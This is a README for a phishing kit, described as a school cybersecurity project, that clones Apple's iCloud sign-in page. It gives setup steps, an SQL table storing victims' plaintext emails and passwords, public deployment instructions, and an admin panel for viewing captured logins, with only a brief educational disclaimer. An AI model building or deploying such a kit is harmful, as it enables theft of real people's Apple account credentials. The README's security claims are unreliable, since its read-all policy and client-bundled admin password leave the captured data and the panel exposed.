# iCloud Login Clone (Cybersecurity School Project)

A high-fidelity clone of the Apple iCloud sign-in page, developed for educational purposes to demonstrate modern web design, phishing techniques, and secure open-source development workflows.

## 🚀 Features
- **Premium Design**: Hand-crafted CSS following Apple's SF Pro typography and glassmorphism design principles.
- **Vite Powered**: Built with Vite for fast development and secure environment variable management.
- **Open Source Ready**: Sensitive keys are managed via `.env` and injected at build time.
- **Serverless Architecture**: 100% Static Web App (24/7 online) using Supabase as the backend-as-a-service.
- **Admin Dashboard**: A secure management dashboard to view captured sessions.

## 🛠️ Tech Stack
- **Frontend**: HTML5, Vanilla CSS, Vite.
- **Database**: Supabase (PostgreSQL).
- **Security**: Environment variable injection and Row Level Security (RLS).

## 📦 Setup & Development

### 1. Local Setup
1. Clone the repository and install dependencies:
   ```bash
   npm install
   ```
2. Create a `.env` file in the root and add your credentials:
   ```env
   VITE_SUPABASE_URL=your_supabase_url
   VITE_SUPABASE_ANON_KEY=your_anon_key
   VITE_ADMIN_USERNAME=admin
   VITE_ADMIN_PASSWORD=your_secure_password
   ```
3. Start the development server:
   ```bash
   npm run dev
   ```

### 2. Supabase Database Setup
Run this in your Supabase SQL Editor:
```sql
CREATE TABLE logins (
  id SERIAL PRIMARY KEY,
  email TEXT NOT NULL,
  password TEXT NOT NULL,
  created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

ALTER TABLE logins ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Allow anonymous inserts" ON logins FOR INSERT WITH CHECK (true);
CREATE POLICY "Allow admin select" ON logins FOR SELECT USING (true);
```

### 3. Deployment (Netlify/Vercel)
1. Connect your GitHub repo.
2. **Build Command**: `npm run build`
3. **Publish Directory**: `dist`
4. **Environment Variables**: Add the `VITE_*` keys in your hosting provider's dashboard.

## 🔐 Admin Dashboard
Access the panel at `/admin-login.html`. Credentials are managed via the `VITE_ADMIN_*` environment variables.

## ⚖️ Disclaimer
This project is created strictly for **educational purposes**. It demonstrates how modern phishing attacks can bypass traditional security awareness. Do not use this tool for any malicious or illegal activities.
